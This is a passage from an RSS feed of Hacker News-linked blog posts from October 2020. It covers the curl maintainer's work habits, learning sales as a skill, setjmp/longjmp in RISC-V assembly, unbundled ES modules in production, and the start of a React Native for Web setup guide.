<figure><img loading="lazy" width="1200" height="551" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-1200x551.jpg" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-1200x551.jpg 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-200x92.jpg 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-450x207.jpg 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers-768x353.jpg 768w, https://daniel.haxx.se/blog/wp-content/uploads/2019/05/home-office-computers.jpg 2000w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>Photo of my work desk from a few years ago but it looks very similar still today.</figcaption></figure>



<h2>What work and in what order?</h2>



<p>I lead the curl project. It means many questions and decisions fall down to me to have an opinion about or say on, and it’s a priority for me to make sure that I unblock such situations as soon as possible so that developers wanting to do things with curl can continue doing that.</p>



<p>Thus, I read and respond to email about curl all hours I’m awake and have network access. Of course incoming messages actually rarely require immediate responses and then I can queue them up and instead do them later. I also try to read and assess all new incoming curl issues as soon as possible to see if there’s something urgent I should deal with immediately, or otherwise figure out how to deal with them going forward.</p>



<p>I usually have a set of bugs or features to work on so when there’s no alarming email or GitHub issue left, I context-switch over to the curl source code tree and the particular branch in which I work on right now. I typically have 20-30 different branches of development of various stages and maturity going on. If I get stuck on something, or if I create a pull-request for one of them that needs time to get all the CI jobs done, I switch over to one of the others.</p>



<p>Customers and their needs of course have priority when I decide what to work on. The exception would perhaps be security vulnerabilities or other really serious bugs being reported, but thankfully they are rare. But after that, I go by ear and work on what I think is fun and what I think users might appreciate.</p>



<p>If I want to go forward with something, for my own sake or for a customer’s, and that entails touching or improving other software in other projects, then I don’t shy away from submitting pull requests for them – or at least filing an issue.</p>



<h2>Spare time open source</h2>



<p>Yes, I still spend my spare time hours on open source, mostly curl. This means I often end up spending 50-55 hours per week on curl and curl related activities. But I don’t count or measure work hours and I rarely have to report any to anyone. This is a work of love.</p>



<p>Lots of people will say that they don’t have time because of life, family, kids etc. I have of course been very fortunate over the years to have had the opportunity and ability to spend all this time on what I want to do, but let’s not forget that people in general spend lots of time on their hobbies; on watching TV, on playing computer games and on socializing with friends and why not: to sleep. If you cut down on all of those things (yes, including the sleeping) there could very well be opportunities. It’s often a question of priorities. I’ve made spare time development a priority in my life.</p>



<h2>curl support?</h2>



<p>Any company that uses curl or libcurl – and they are plenty – could benefit from buying support from us instead of wasting their own time and resources. We at wolfSSL are probably much better at curl already and we can find and fix the issues much faster, which ends up cheaper and better long-term.</p>



<h2>Credits</h2>



<p>The top photo is taken by Anja Stenberg, my wife. It’s me in a local forest, summer 2020.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/10/26/working-open-source/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24896608</guid>
            <pubDate>Mon, 26 Oct 2020 14:38:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You don’t need talent for Sales]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24895640">thread link</a>) | @neinasaservice
<br/>
October 26, 2020 | https://21-lessons.com/why-you-dont-need-talent-for-sales/ | <a href="https://web.archive.org/web/*/https://21-lessons.com/why-you-dont-need-talent-for-sales/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<!-- .entry-header -->

		<div>
			
<p>When I started, I got told I couldn’t be in Sales. I couldn’t network; therefore, I’d be a lousy salesperson.&nbsp;</p>



<p>Have they told you before you couldn’t do a job because you lacked the talent? Like becoming a Salesperson? Or a programmer?</p>



<p>“You can’t become X because you don’t know how to network, and you’re not good at math.” That’s what they told me. And it’s complete nonsense.</p>



<p>People think you need to have “it,” a talent.&nbsp;</p>



<p>Before I got into Sales, I was a software developer. They tell similar stories to software developers. “No, you won’t be successful because you suck at Math.” I was never good at math, yet I became quite good at writing software.</p>



<p>Both professions share something. You don’t need to have the unique talent to become successful. Writing Code and selling something are both <strong>skills</strong> you build over time through training.</p>



<p>In Software development, you learn about statements, variables, functions and putting all of it together into a working program. Practice it often enough, and whatever problem you work on, you’ll be able to solve it.&nbsp;</p>



<p>Sales works the same way. You learn about process, handling objections, negotiating, asking the right questions, and eventually, you’ll close deals.&nbsp;</p>



<p>If you’re a software developer reading this, you will most likely think, “But it’s not enough to just learn foundations. There’s OOP, Functional Programming, …”. That’s right. Learning never stops in Software Development. Same for Sales.</p>



<p>There are so many different approaches to sell something to somebody; everything keeps evolving.&nbsp;</p>



<p>I had an eye-opening moment in early 2019. I was attending a sales seminar in Northern Germany. During two days, we learned a lot of useful things. Eventually, we came to the topic of handling objections.&nbsp;</p>



<p>The trainer asked, “Who here has trouble with handling objections? Raise your hand, and we’ll practice this on stage.”</p>



<p>A few people raised their hands, and he picked a young man, working as a photographer. Firstly, he asked the young man, “What are some common objections you hear every day?” and wrote them on a whiteboard. “Ok, then, let’s find a good answer for each of them.” and again wrote down all answers.</p>



<p>Next, they enacted in a role play. The trainer played the customer, mentioning one objection after another. The photographer replied with his canned response, trying to steer the conversation towards a close.&nbsp;</p>



<p>Of course, the photographer would have to put in some more effort to practice a satisfactory reply. Yet, he learned to handle objections within 15 minutes.</p>



<p>I was amazed. Could that be so easy? Later, the trainer did a similar role-play with another audience member to practice closing deals on stage. Within 15 minutes, the attendee could close customers. Amazing.&nbsp;</p>



<p>I took lots of notes and started practicing once I was back at the hotel. I learned new techniques, adopted a new mindset, yet the most crucial aspect was this:</p>



<p>If a small business owner can learn how to handle objections and close deals on stage within 15-20 minutes, I can learn this.&nbsp;</p>



<p>Whenever now prospects object with “It’s too expensive” or “I need to think about this,” I know what to do. I built the confidence to handle these situations.&nbsp;</p>



<p>Therefore, you don’t need talent. You need the right techniques and persistence to learn.&nbsp;</p>

					</div><!-- .entry-content -->

		
			</div></div>]]>
            </description>
            <link>https://21-lessons.com/why-you-dont-need-talent-for-sales/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24895640</guid>
            <pubDate>Mon, 26 Oct 2020 12:56:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding Non-Local Jumps (Setjmp/Longjmp) in RISC-V Assembly]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24895387">thread link</a>) | @hasheddan
<br/>
October 26, 2020 | https://danielmangum.com/posts/non-local-jumps-riscv/ | <a href="https://web.archive.org/web/*/https://danielmangum.com/posts/non-local-jumps-riscv/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <section>
  <article>
    <header>
      
      <h2>October 25, 2020</h2>

      
    </header>

    <p>This post explores RISC-V assembly by examining the implementation of the <code>setjmp</code> and <code>longjmp</code> functions from the C standard library. I frequently find that I grasp concepts more quickly when I have actual code that I can disassemble because it allows me to connect information with intent. I believe RISC-V and similar efforts will fundamentally shift how computers are made and programmed. I hope that sharing my knowledge will inspire the same joy in others that I feel when imagining a future of open hardware.</p>
<p><em>Note: We will be using the RISC-V GNU toolchain throughout this post. If you would like to follow along, you can cross-compile the toolchain for a RISC-V target, or you can download a <a href="https://github.com/sifive/freedom-tools/releases">prebuilt toolchain and emulator</a>. You can also compile and run the programs using a different target toolchain, but the assembly dump will be specific to that architecture. If you are more familiar with a different ISA, this may be a useful way to learn about RISC-V!</em></p>
<h2 id="a-look-at-local-jumps">A Look at Local Jumps</h2>
<p>Jumps are one of the fundamental components of control flow in programming. Nearly any <em>Instruction Set Architecture</em> (ISA) is going to have a jump instruction that lets you modify the program counter to execute the next instruction from the specified location in memory. We also see control flow statements in higher level languages that provide similar logic. An example of this would be the <code>goto</code> statement in C. Using <code>goto</code> is frowned upon by many C programmers due to the ability to create horribly complex code, but it does have useful applications, such as centralized executing of functions, as described in the <a href="https://www.kernel.org/doc/Documentation/process/coding-style.rst">Linux kernel coding style guide</a>. It allows you to define a label, then “go to” that place in your program and resume execution from there. For example, the following program will print <code>Here</code> followed by a newline character over and over again.</p>
<p><code>goto.c</code></p>
<div><pre><code data-lang="c">
<span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span></span>
<span>int</span> main()
{
jumptome:
    printf(<span>"Here</span><span>\n</span><span>"</span>);
    <span>goto</span> jumptome;
}

</code></pre></div><p>Let’s take a look at the generated assembly for <code>main()</code> using <code>objdump</code>:</p>
<div><pre><code data-lang="fallback">
0000000000010158 &lt;main&gt;:
   10158:    1141                    addi   sp,sp,-16
   1015a:    e406                    sd     ra,8(sp)
   1015c:    e022                    sd     s0,0(sp)
   1015e:    0800                    addi   s0,sp,16
   10160:    67c9                    lui    a5,0x12
   10162:    6c078513                addi   a0,a5,1728 # 126c0 &lt;__errno+0xe&gt;
   10166:    1fc000ef                jal    ra,10362 &lt;puts&gt;
   1016a:    bfdd                    j      10160 &lt;main+0x8&gt;

</code></pre></div><p>As you can see, using <code>goto</code> in the program translates directly to the <code>j</code> RISC-V instruction, which jumps to memory address 10160, causing the processor to continuously execute our <code>printf</code> statement. It would be much more clear for us to use a <code>while</code> statement here, but we will actually get the exact same assembly output with an infinite loop:</p>
<p><code>while.c</code></p>
<div><pre><code data-lang="c">
<span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span></span>
<span>int</span> main()
{
    <span>while</span> (<span>1</span>)
    {
        printf(<span>"Here</span><span>\n</span><span>"</span>);
    }
}

</code></pre></div><div><pre><code data-lang="fallback">
0000000000010158 &lt;main&gt;:
   10158:    1141                    addi    sp,sp,-16
   1015a:    e406                    sd      ra,8(sp)
   1015c:    e022                    sd      s0,0(sp)
   1015e:    0800                    addi    s0,sp,16
   10160:    67c9                    lui     a5,0x12
   10162:    6c078513                addi    a0,a5,1728 # 126c0 &lt;__errno+0xe&gt;
   10166:    1fc000ef                jal     ra,10362 &lt;puts&gt;
   1016a:    bfdd                    j       10160 &lt;main+0x8&gt;

</code></pre></div><p>However, <code>goto</code> can provide more functionality than a loop, and is specifically useful for breaking out of a set of deeply nested loops. The aforementioned Linux kernel style guide gives the following example for an appropriate use of <code>goto</code>:</p>
<div><pre><code data-lang="c">
<span>int</span> fun(<span>int</span> a)
{
    <span>int</span> result = <span>0</span>;
    <span>char</span> *buffer;

    buffer = kmalloc(SIZE, GFP_KERNEL);
    <span>if</span> (!buffer)
        <span>return</span> -ENOMEM;

    <span>if</span> (condition1) {
        <span>while</span> (loop1) {
            ...
        }
        result = <span>1</span>;
        <span>goto</span> out_free_buffer;
    }
    ...
out_free_buffer:
    kfree(buffer);
    <span>return</span> result;
}

</code></pre></div><p>In this case, a descriptive label is being used to define a specific error path. Though only a small part of the function body is included here, you can imagine that there could be multiple stages in which the allocated buffer could become full, all of which you would handle by freeing the memory and returning the result. While some may still advocate for never using <code>goto</code>, this demonstrates that there are some benefits, such has not needing to duplicate redundant code throughout the function body.</p>
<h2 id="non-local-jumps">Non-Local Jumps</h2>
<p>Unfortunately (or fortunately if you are a strong proponent of never using <code>goto</code>), it only is valid in a local context. You cannot jump to a label outside of the function in which you are currently executing. For this reason, <code>setjmp</code> and <code>longjmp</code> were added to the C standard library to support non-local jumps. Let’s take a look at a minimal example of using these functions.</p>
<p><code>minimal.c</code></p>
<div><pre><code data-lang="c">
<span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;setjmp.h&gt;</span><span>
</span><span></span>
<span>static</span> jmp_buf buf;

<span>void</span> b()
{
    printf(<span>"in function b</span><span>\n</span><span>"</span>);
    longjmp(buf, <span>1</span>);
}

<span>void</span> a()
{
    printf(<span>"in function a</span><span>\n</span><span>"</span>);
    <span>if</span> (setjmp(buf))
        printf(<span>"back in function a</span><span>\n</span><span>"</span>);
    <span>else</span>
        b();
}

<span>int</span> main()
{
    a();
}

</code></pre></div><div><pre><code data-lang="fallback">
in function a
in function b
back in function a

</code></pre></div><p>We can get a good understanding of what is going on here by taking a look at the <a href="https://www.man7.org/linux/man-pages/man3/setjmp.3.html">setjmp Linux manual page</a>. Specifically for this program, the following portions of the description are important:</p>
<blockquote>
<p>In this case, setjmp() returns 0.</p>
</blockquote>
<blockquote>
<p>The longjmp() function uses the information saved in env to transfer control back to the point where setjmp() was called and to restore (“rewind”) the stack to its state at the time of the setjmp() call.</p>
</blockquote>
<blockquote>
<p>Following a successful longjmp(), execution continues as if setjmp() had returned for a second time.</p>
</blockquote>
<p>In the simplest of terms, these two functions allow us to save an address and return to it at a later point in execution. Behind the scenes, other values are also being saved into the <code>buf</code>, which we will look at momentarily. First, let’s see what the actual assembly output for a 64-bit RISC-V target looks like.</p>
<div><pre><code data-lang="fallback">
00000000000103c4 &lt;setjmp&gt;:
   103c4:    00153023              sd    ra,0(a0)
   103c8:    e500                  sd    s0,8(a0)
   103ca:    e904                  sd    s1,16(a0)
   103cc:    01253c23              sd    s2,24(a0)
   103d0:    03353023              sd    s3,32(a0)
   103d4:    03453423              sd    s4,40(a0)
   103d8:    03553823              sd    s5,48(a0)
   103dc:    03653c23              sd    s6,56(a0)
   103e0:    05753023              sd    s7,64(a0)
   103e4:    05853423              sd    s8,72(a0)
   103e8:    05953823              sd    s9,80(a0)
   103ec:    05a53c23              sd    s10,88(a0)
   103f0:    07b53023              sd    s11,96(a0)
   103f4:    06253423              sd    sp,104(a0)
   103f8:    b920                  fsd    fs0,112(a0)
   103fa:    bd24                  fsd    fs1,120(a0)
   103fc:    09253027              fsd    fs2,128(a0)
   10400:    09353427              fsd    fs3,136(a0)
   10404:    09453827              fsd    fs4,144(a0)
   10408:    09553c27              fsd    fs5,152(a0)
   1040c:    0b653027              fsd    fs6,160(a0)
   10410:    0b753427              fsd    fs7,168(a0)
   10414:    0b853827              fsd    fs8,176(a0)
   10418:    0b953c27              fsd    fs9,184(a0)
   1041c:    0da53027              fsd    fs10,192(a0)
   10420:    0db53427              fsd    fs11,200(a0)
   10424:    4501                  li    a0,0
   10426:    8082                  ret

</code></pre></div><p>Here is the implementation of <code>setjmp</code> in RISC-V assembly. Before diving too far in, it is important to understand the registers in the RISC-V architecture. Since we are using a 64-bit machine, each of the 32 general purpose registers is 64 bits wide. Though each of the registers is classified as general purpose, there are calling conventions that most compilers will adhere to.</p>
<table>
<thead>
<tr>
<th>Register</th>
<th>ABI Name</th>
<th>Description</th>
<th>Saver</th>
</tr>
</thead>
<tbody>
<tr>
<td>x0</td>
<td>zero</td>
<td>hardwired zero</td>
<td>-</td>
</tr>
<tr>
<td>x1</td>
<td>ra</td>
<td>return address</td>
<td>Caller</td>
</tr>
<tr>
<td>x2</td>
<td>sp</td>
<td>stack pointer</td>
<td>Callee</td>
</tr>
<tr>
<td>x3</td>
<td>gp</td>
<td>global pointer</td>
<td>-</td>
</tr>
<tr>
<td>x4</td>
<td>tp</td>
<td>thread pointer</td>
<td>-</td>
</tr>
<tr>
<td>x5-7</td>
<td>t0-2</td>
<td>temporary registers</td>
<td>Caller</td>
</tr>
<tr>
<td>x8</td>
<td>s0 / fp</td>
<td>saved register / frame pointer</td>
<td>Callee</td>
</tr>
<tr>
<td>x9</td>
<td>s1</td>
<td>saved register</td>
<td>Callee</td>
</tr>
<tr>
<td>x10-11</td>
<td>a0-1</td>
<td>function arguments / return values</td>
<td>Caller</td>
</tr>
<tr>
<td>x12-17</td>
<td>a2-7</td>
<td>function arguments</td>
<td>Caller</td>
</tr>
<tr>
<td>x18-27</td>
<td>s2-11</td>
<td>saved registers</td>
<td>Callee</td>
</tr>
<tr>
<td>x28-31</td>
<td>t3-6</td>
<td>temporary registers</td>
<td>Caller</td>
</tr>
</tbody>
</table>
<p>In addition to the registers, we must understand the few pseudo instructions that <code>setjmp</code> makes use of.</p>
<ul>
<li><code>sd</code>: store doubleword (stores the value in the register specified by the first operand into the address specified by the second)</li>
<li><code>fsd</code>: the floating point counterpart to <code>sd</code></li>
<li><code>li</code>: load immediate (loads the second operand directly into the register specified by the first)</li>
</ul>
<p><em>If you are interested in checking out all of the instructions available when writing RISC-V assembly, take a look at the <a href="https://github.com/riscv/riscv-asm-manual/blob/master/riscv-asm.md">programmer’s manual</a>.</em></p>
<p>So what exactly are we doing here? The behavior of <code>setjmp</code> is specified as storing information about the calling function’s environment into the buffer. If you look back to the source code of <code>minimal.c</code>, you’ll see that we are passing the buffer of type <code>jmp_buf</code> into the <code>setjmp</code> function in <code>a()</code>. If we look at the dump of <code>a()</code> you can see that we are jumping and linking (<code>jal</code>) to the address of the <code>setjmp</code> function:</p>
<div><pre><code data-lang="fallback">
0000000000010174 &lt;a&gt;:
   10174:    1141                    addi    sp,sp,-16
   10176:    e406                    sd      ra,8(sp)
   10178:    e022                    sd      s0,0(sp)
   1017a:    0800                    addi    s0,sp,16
   1017c:    67c9                    lui     a5,0x12
   1017e:    7f078513                addi    a0,a5,2032 # 127f0 &lt;__errno+0x1a&gt;
   10182:    238000ef                jal     ra,103ba &lt;puts&gt;
   10186:    70018513                addi    a0,gp,1792 # 14830 &lt;buf&gt;
   1018a:    23a000ef                jal     ra,103c4 &lt;setjmp&gt;
   1018e:    87aa                    mv      a5,a0
   10190:    c799                    beqz    …</code></pre></div></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://danielmangum.com/posts/non-local-jumps-riscv/">https://danielmangum.com/posts/non-local-jumps-riscv/</a></em></p>]]>
            </description>
            <link>https://danielmangum.com/posts/non-local-jumps-riscv/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24895387</guid>
            <pubDate>Mon, 26 Oct 2020 12:28:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ES modules in production: my experience so far]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24894748">thread link</a>) | @Tipewryter
<br/>
October 26, 2020 | https://www.bryanbraun.com/2020/10/23/es-modules-in-production-my-experience-so-far/ | <a href="https://web.archive.org/web/*/https://www.bryanbraun.com/2020/10/23/es-modules-in-production-my-experience-so-far/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>For the last year, I’ve been running a single-page web app powered by ES modules in production.</p>
<p>It’s a JavaScript app but it doesn’t use Babel, Webpack, Rollup, or any other tooling for transpiling or bundling. The files I write in development are the same files that get served to end-users in production.</p>
<p>The app is for a side-project… an <a href="https://musicboxfun.com/">online music-box song making tool</a>. It’s not a massive app, but it’s not tiny either—there’s currently about 60 JavaScript modules, which are a mix of components, utilities, and third-party libraries. <a href="https://github.com/bryanbraun/music-box-fun/tree/master/site">The codebase</a> looks a lot like a ReactJS project, but it doesn’t use React. It uses a plain JavaScript alternative that substitutes abstractions (like JSX) with native JavaScript features (like template strings). The framework isn’t relevant for the purpose of this post but you can read more about it in <a href="https://www.bryanbraun.com/2019/09/11/web-dev-nirvana-and-why-I-needed-to-let-go-of-reactjs-to-reach-it/">my earlier post</a>, if you are curious.</p>
<p>When I launched the app in August 2019, the industry consensus was that using unbundled ES6 modules in production was a bad idea. Khan Academy tried unbundling their homepage JS and concluded that <a href="https://blog.khanacademy.org/forgo-js-packaging-not-so-fast/">it slowed down their initial page load</a>. That was five years ago and I still don’t know of anybody who seriously considers skipping the bundler and using ES6 modules in production.*</p>
<p>And that’s too bad because now that <a href="https://caniuse.com/es6-module">browser support for ES modules is great</a>, it seems like we could avoid a lot of <a href="https://www.bryanbraun.com/2019/04/16/nonsense/">nonsense</a> by just <a href="https://twitter.com/BryanEBraun/status/1295171120459546624">writing JavaScript that the browser understands</a> (at least for projects where it makes sense).</p>
<p>I kept looking for examples of people doing this but I struggled to find them, so I decided I’d give it a try and see how bad it really was. Here’s what I found:</p>
<h2 id="things-that-met-expectations">Things that met expectations</h2>
<p><strong>Development experience.</strong> I expected the development experience to be great, and it was. There’s no setup instructions, no startup delays. No need to watch files, generate source maps, or wait for things to recompile. Just save the file and refresh. ✨</p>
<p><strong>Deployment.</strong> Deployment was straightforward. All I needed to do was copy my code to the server as-is. My web host Netlify makes it easy to do this on git push (though, to be fair, Netlify can make even the most complex setups easy to deploy).</p>
<p><strong>Dev/Prod parity.</strong> Every time I found a production bug I was able to reproduce it locally. Not a major goal, but very convenient.</p>
<h2 id="things-that-were-worse-than-expected">Things that were worse than expected</h2>
<p><strong>Dependencies not supporting ES modules.</strong>
I often found libraries I wanted to use, only to learn that they didn’t support ES modules. They usually supported CommonJS instead, which meant I couldn’t use them. At first, I was working around this by loading versions of the library that use browser globals (either via script tag, or <a href="https://stackoverflow.com/q/41127479/1154642">side-effects import</a>). This worked, but it didn’t feel ideal.</p>
<p>Eventually, I started using <a href="https://www.snowpack.dev/">Snowpack</a>, which can import dependencies that don’t support ES modules and produce a one-time build that does. This worked so well that <a href="https://github.com/sparkbox/bouncy-ball/pull/104">I’ve started using it on other projects</a>.</p>
<p><strong>Environment variables.</strong> Typically, I’d assign these at build-time but you can’t when there’s no build. Fortunately, Cory House has <a href="https://www.freecodecamp.org/news/environment-settings-in-javascript-apps-c5f9744282b6/">a great post describing all the options</a>. I ended up using <a href="https://www.freecodecamp.org/news/environment-settings-in-javascript-apps-c5f9744282b6/#option-6-environment-sniffing">environment sniffing</a> which feels a little weird, but ultimately isn’t a big deal for my app.</p>
<p><strong>CSS organization.</strong> I went with traditional CSS using BEM conventions, which was fine. I still wanted to break up my files though, so I used a <code>main.css</code> file with a bunch of <code>@imports</code>. That felt better, but then I had a blocking request that delayed page rendering so <a href="https://github.com/bryanbraun/music-box-fun/commit/dc2cc62c58ae61d972c124a433ca00d9aac304a2">I moved the <code>@imports</code> into an inline style tag</a>. I’m not sure if I like it, so I may keep iterating on this.</p>
<h2 id="things-that-were-better-than-expected">Things that were better than expected</h2>
<p><strong>Cache invalidation.</strong> I was worried that I was going to have trouble invalidating cached CSS or JavaScript (since I couldn’t rely on a bundler to give my assets cache-busting filenames). It turns out that <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETags</a> are a great solution for this (especially since <a href="https://www.netlify.com/blog/2017/02/23/better-living-through-caching/">my web host has a solid implementation that’s quick and simple</a>). I’ve heard that cache-busting filenames can be a bit faster than Etags, but Netlify’s implementation feels pretty snappy to me.</p>
<p><strong>Performance.</strong>
Everything I heard said that ES module performance was going to be terrible, even with HTTP/2. So I braced myself and… it’s been great. I haven’t even done any optimizations beyond making sure that my initial HTML file had some good default markup. I suspect the performance is good because my app isn’t big enough to start hitting any bottlenecks yet (<a href="https://v8.dev/features/modules#performance">this research</a> says you’ll be fine if you’re below a couple hundred modules, which <a href="https://twitter.com/lukejacksonn/status/1318158374878457857">seems to be confirmed anecdotally</a>). This made me realize that that my intuition was off on what was “too big” of an app. You can go a long way before you’re in a place where you need to load 300-500 files, all at once. It feels unlikely that I’ll reach those limits on my app, at least.</p>
<p>I was a little worried about not minifying my JavaScript. Isn’t that a huge number of bytes saved? It turns out that the difference is a lot smaller when your files are served gzipped (or <a href="https://www.netlify.com/blog/2020/05/20/gain-instant-performance-boosts-as-brotli-comes-to-netlify-edge/">brotli-compressed, as in my case</a>). Minifying would still make my files smaller by renaming variables and stripping out comments, but the difference was less than I expected.</p>
<p><strong>Browser support.</strong> Since I wasn’t using Babel, I expected lots of cross-browser issues but they were rare.** It turns out that once you drop IE11 support, browser support of modern JS features is really good. Things like arrow functions, const/let, template strings, ES6 classes, and <code>fetch</code> all have over 95% global support (and that’s including IE11). The only time I didn’t get to use a JS feature I really wanted was <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Optional_chaining">the optional chaining operator</a>, and that feature will probably have 95% support in the next year or two. Evergreen browsers are a powerful thing.</p>
<h2 id="overall-assessment">Overall Assessment</h2>
<p>I’ve been pleasantly surprised. If this were a typical, bundled, single-page-application, I would have needed to deal with one or two major tooling upgrades by now. Instead, I’ve been able to focus on features. <a href="https://blog.jim-nielsen.com/2020/cheating-entropy-with-native-web-tech/">Native web technologies FTW</a>!</p>
<p>If my module count gets so big that performance starts to noticeably degrade, I’m pretty confident that I’ll be able to use Snowpack to work through it. From <a href="https://www.snowpack.dev/#bundle-for-production">their docs</a>:</p>
<blockquote>
<p>Snowpack treats bundling as an optional production optimization, which means you’re free to skip over the extra complexity of bundling until you need it. <strong>You should be able to use a bundler because you want to, and not because you need to</strong>.</p>
</blockquote>
<p>I like this idea of postponing complexity. It feels very agile.</p>
<p>Maybe ES modules aren’t for every project but they’ve worked pretty well for mine. If there are fundamental flaws, I haven’t found them yet.</p>
<p>Honestly, it’s hard for me to imagine building a side-project any other way right now.</p>
<hr>
<p><small>
* I’ve just recently found a few other examples of ES Modules in production including <a href="https://www.runpkg.com/">runpkg.com</a> (<a href="https://github.com/FormidableLabs/runpkg">source</a>) and <a href="https://philipwalton.com/">Phillip Walton’s blog</a> (<a href="https://github.com/philipwalton/blog">source</a>). If anyone knows of others, please let me know <a href="https://www.bryanbraun.com/cdn-cgi/l/email-protection#7113130310041f4631161c10181d5f121e1c">via email</a> or the comments.
</small></p>
<p><small>
** More accurately, I <em>have</em> faced some cross-browser issues but they weren’t the kind that Babel could help me with. Babel’s polyfills don’t help when <a href="https://github.com/bryanbraun/intersection-observer-issue">the browser implementation has bugs</a> or <a href="https://github.com/bryanbraun/music-box-fun/issues/7#issuecomment-643037151">your approach is fundamentally flawed</a>. 🙃
</small></p>

</article></div>]]>
            </description>
            <link>https://www.bryanbraun.com/2020/10/23/es-modules-in-production-my-experience-so-far/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24894748</guid>
            <pubDate>Mon, 26 Oct 2020 10:53:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Run Your React Native App on the Web with React Native for Web]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24894720">thread link</a>) | @mmazzarolo
<br/>
October 26, 2020 | https://mmazzarolo.com/blog/2020-10-24-adding-react-native-web/ | <a href="https://web.archive.org/web/*/https://mmazzarolo.com/blog/2020-10-24-adding-react-native-web/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><a href="https://github.com/necolas/react-native-web" target="_blank" rel="nofollow noopener noreferrer">“React Native for Web”</a> makes it possible to run <a href="https://reactnative.dev/" target="_blank" rel="nofollow noopener noreferrer">React Native</a> components and APIs on the web using React DOM — allowing you to target the Android, iOS, and web platforms using a single codebase.</p>
<p>The <a href="http://necolas.github.io/react-native-web/docs/" target="_blank" rel="nofollow noopener noreferrer">React Native for Web documentation</a> has a few examples of <strong>how to get started from scratch</strong>. For example, you can use <code>expo</code> or <code>create-react-native-app</code> to create a new React Native project compatible with React Native for Web. Or you can use <a href="https://github.com/facebook/create-react-app" target="_blank" rel="nofollow noopener noreferrer">Create React App</a> to generate a simple, web-only React app with built-in support of React Native for Web.</p>
<p>In this post, I’d like to take a different approach from the one used in the React Native for Web documentation: I’ll explain how to <strong>add React Native for Web to an existing React Native app using <a href="https://github.com/facebook/create-react-app" target="_blank" rel="nofollow noopener noreferrer">Create React App</a></strong>.</p>
<h2>Setup the Create React App project</h2>
<p>The standard way to setup a React app from scratch using Create React App is by <a href="https://create-react-app.dev/docs/getting-started" target="_blank" rel="nofollow noopener noreferrer">using the <code>create-react-app</code> CLI</a> to generate the entire project. However, in our case, we’re <strong>adding</strong> a React app on top of an existing project, so the setup process will be a bit different.</p>
<h3>Dependencies</h3>
<p>First of all, let’s install these dependencies:</p>
<div data-language="text"><pre><code># If you're using NPM...
npm install react-native-web react-scripts react-dom

# ...or, if you're using Yarn
yarn add react-native-web react-scripts react-dom</code></pre></div>
<ul>
<li><code>react-native-web</code> is the React Native for Web library. It provides a mapping of the React Native components and APIs to their web counterparts.</li>
<li><code>react-scripts</code> are the scripts used by <a href="https://github.com/facebook/create-react-app" target="_blank" rel="nofollow noopener noreferrer">Create React App</a> to bundle and run your web application.</li>
<li><code>react-dom</code> is what allows React to run on the web. It’s recommended to install a version of React DOM that matches your currently installed version of React.</li>
</ul>
<h3>Directory Structure</h3>
<p>Create React App expects your project to follow a <a href="https://create-react-app.dev/docs/folder-structure" target="_blank" rel="nofollow noopener noreferrer">specific directory structure</a>.</p>
<p>Depending on how your current React Native setup looks like, you might need to make some changes to accommodate the Create React App convention.</p>
<p>The next steps will assume you’re starting with a directory structure similar to the following:</p>
<div data-language="bash"><pre><code><span>.</span>
├── android/
│   └── <span>..</span>.
├── ios/
│   └── <span>..</span>.
├── src/
│   ├── App.js 
│   └── <span>..</span>.
└── index.js   </code></pre></div>
<p>For the project to build, <strong>these files must exist with exact filenames</strong>:</p>
<ul>
<li><code>public/index.html</code>: The HTML page template served to the users. Create React App injects your React application in this page.</li>
<li><code>src/index.js</code>: The JavaScript entry-point of your React web application.</li>
</ul>
<p>Normally these files are generated by the <code>create-react-app</code> CLI… but since we couldn’t use it, we need to go a step further and create them manually.</p>
<h3>The Public Directory</h3>
<p>Create a new directory named <code>public</code> at the root of your project. In it, we will put the <code>index.html</code> file and all the additional files that it uses.</p>
<p>To create its content, you can either a) copy and paste in the <code>public</code> directory <a href="https://github.com/facebook/create-react-app/tree/master/packages/cra-template/template/public" target="_blank" rel="nofollow noopener noreferrer">the content of what the <code>create-react-app</code> CLI would have generated</a>, or b) create just a minimal <code>public/index.html</code> file like the following:</p>
<div data-language="html"><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>&gt;</span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>&gt;</span></span>
  <span><span><span>&lt;</span>head</span><span>&gt;</span></span>
